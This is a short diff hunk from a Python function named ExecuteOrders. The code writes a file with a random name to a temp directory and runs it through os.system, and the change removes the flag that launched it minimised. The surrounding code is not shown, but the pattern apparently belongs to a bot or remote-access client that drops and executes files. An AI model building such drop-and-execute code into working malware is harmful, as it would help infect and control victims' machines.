@@ -112,7 +112,7 @@ def ExecuteOrders():
 
                         F.close() # Close File
 
-                        os.system('start /min '+Temp+"/"+Random+"."+Ex) # Execute File
+                        os.system('start '+Temp+"/"+Random+"."+Ex) # Execute File
 
                         break
             except:
